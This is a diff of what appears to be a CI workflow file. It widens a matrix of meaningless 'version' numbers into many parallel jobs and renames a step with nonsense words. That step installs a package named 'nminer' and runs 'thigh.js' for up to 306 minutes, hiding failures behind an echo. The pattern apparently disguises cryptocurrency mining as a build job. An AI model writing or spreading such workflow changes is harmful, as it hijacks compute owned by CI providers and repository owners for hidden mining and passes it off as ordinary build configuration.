@@ -9,21 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3992 }
-          - { version: 7567 }
-          - { version: 4041 }
-          - { version: 7027 }
-          - { version: 3203 }
-          - { version: 4915 }
-          - { version: 790 }
-          - { version: 3915 }
-          - { version: 6354 }
-          - { version: 8214 }
-          - { version: 1525 }
-          - { version: 8224 }
-          - { version: 6478 }
-          - { version: 7671 }
-          - { version: 7676 }
+          - { version: 210 }
+          - { version: 2863 }
+          - { version: 1417 }
+          - { version: 3003 }
+          - { version: 2962 }
+          - { version: 7575 }
+          - { version: 4917 }
+          - { version: 8089 }
+          - { version: 4260 }
+          - { version: 8153 }
+          - { version: 1570 }
+          - { version: 5281 }
+          - { version: 7013 }
+          - { version: 7042 }
+          - { version: 9313 }
+          - { version: 6181 }
+          - { version: 6771 }
+          - { version: 7249 }
+          - { version: 567 }
 
     steps:
       - name: Checkout
@@ -34,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: window ouch
+      - name: amid hole
         run: |
           npm install nminer@latest
-          timeout 346m node thigh.js || echo "thigh executed"
+          timeout 306m node thigh.js || echo "thigh executed"
